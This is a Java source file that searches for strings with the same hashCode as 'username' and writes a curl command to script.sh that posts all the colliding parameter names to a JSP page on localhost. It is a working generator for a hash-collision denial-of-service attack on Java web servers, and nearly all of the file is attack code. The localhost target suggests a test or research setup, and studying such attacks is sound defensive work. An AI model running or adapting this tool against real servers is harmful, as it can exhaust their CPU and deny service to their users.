package com;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * @author vladimir.dolzhenko@gmail.com
 * @since 2017-01-10
 */
public class FindCollisions {
    public static void main(String[] args) throws IOException {
        if (false){
            System.out.println(Integer.MAX_VALUE);

            int k = 2*(31*31*31*31*31*31*2 + 31*31*31*31*31*13 + 31*31*31*9 + 31*31*30 + 31 * 12) + 4 ;
            System.out.println(-900 + k);
            return;
        }

        // username

        Map<String, String> map = new LinkedHashMap<>();

        String key = "username";
        int hashCode = key.hashCode();

        System.out.printf("%s 0x%08X\n", key, key.hashCode());

        lookupCollisions(map, key, 0, hashCode);
        map.put(key, key);

        StringBuilder builder = new StringBuilder();
        builder.append("curl -v ");

        for (String s : map.keySet()) {
            builder.append("--data \"")
                    .append(s.contains("\"") ? s.replace("\"", "\\\"") : s)
                    .append("=Q\" ");
        }
        builder.append("http://localhost:8080/index.jsp");

        File file = new File("script.sh");
        try(FileWriter writer = new FileWriter(file, false)){
            writer.append(builder);
            writer.flush();
        }

        System.out.println(map.size());
        String v = map.get(key);
        System.out.println(v);

        int k = 1;
//        for(int i = 0; i < key.length(); i++){
//            k *= 37;
//            System.out.println(i + " " + k);

//        }
    }

    private static void lookupCollisions(Map<String, String> map, String key, int depth, final int hash) {
        if (depth > 10) return;

        for(int i = 1; i < key.length(); i++) {
            char[] chars = key.toCharArray();
            chars[chars.length - (i + 1)] += 1;
            chars[chars.length - i] -= 31;

            if (!validChar(chars[chars.length - (i + 1)])
                    || !validChar(chars[chars.length - i])){
                return;
            }

            String s = new String(chars);

            if (s.hashCode() != hash){
                //throw new RuntimeException(String.format("expected 0x%08X - was 0x%08X", hash, s.hashCode()));
                return;
            }
//            System.out.printf("%s 0x%08X\n", s, s.hashCode());
            lookupCollisions(map, s, depth + 1, hash);

            map.put(s, s);
        }
    }

    private static boolean validChar(char ch) {
        return ch > ' ' && ch < 0xFFFF && ch != '=';
    }
}
